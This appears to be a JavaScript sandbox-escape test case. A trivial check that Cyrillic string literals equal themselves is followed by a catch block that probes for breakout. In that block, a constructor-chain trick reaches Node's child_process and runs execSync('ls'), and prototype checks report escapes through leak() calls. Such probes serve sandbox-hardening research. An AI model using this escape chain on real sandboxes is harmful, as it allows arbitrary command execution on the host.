try {
    if ('А' !== 'А') {
        $ERROR('#А');
    }
    if ('Б' !== 'Б') {
        $ERROR('#Б');
    }
    if ('В' !== 'В') {
        $ERROR('#В');
    }
    if ('Г' !== 'Г') {
        $ERROR('#Г');
    }
    if ('Д' !== 'Д') {
        $ERROR('#Д');
    }
    if ('Е' !== 'Е') {
        $ERROR('#Е');
    }
    if ('Ж' !== 'Ж') {
        $ERROR('#Ж');
    }
    if ('З' !== 'З') {
        $ERROR('#З');
    }
    if ('И' !== 'И') {
        $ERROR('#И');
    }
    if ('Й' !== 'Й') {
        $ERROR('#Й');
    }
    if ('К' !== 'К') {
        $ERROR('#К');
    }
    if ('Л' !== 'Л') {
        $ERROR('#Л');
    }
    if ('М' !== 'М') {
        $ERROR('#М');
    }
    if ('Н' !== 'Н') {
        $ERROR('#Н');
    }
    if ('О' !== 'О') {
        $ERROR('#О');
    }
    if ('П' !== 'П') {
        $ERROR('#П');
    }
    if ('Р' !== 'Р') {
        $ERROR('#Р');
    }
    if ('С' !== 'С') {
        $ERROR('#С');
    }
    if ('Т' !== 'Т') {
        $ERROR('#Т');
    }
    if ('У' !== 'У') {
        $ERROR('#У');
    }
    if ('Ф' !== 'Ф') {
        $ERROR('#Ф');
    }
    if ('Х' !== 'Х') {
        $ERROR('#Х');
    }
    if ('Ц' !== 'Ц') {
        $ERROR('#Ц');
    }
    if ('Ч' !== 'Ч') {
        $ERROR('#Ч');
    }
    if ('Ш' !== 'Ш') {
        $ERROR('#Ш');
    }
    if ('Щ' !== 'Щ') {
        $ERROR('#Щ');
    }
    if ('Ъ' !== 'Ъ') {
        $ERROR('#Ъ');
    }
    if ('Ы' !== 'Ы') {
        $ERROR('#Ы');
    }
    if ('Ь' !== 'Ь') {
        $ERROR('#Ь');
    }
    if ('Э' !== 'Э') {
        $ERROR('#Э');
    }
    if ('Ю' !== 'Ю') {
        $ERROR('#Ю');
    }
    if ('Я' !== 'Я') {
        $ERROR('#Я');
    }
    if ('Ё' !== 'Ё') {
        $ERROR('#Ё');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}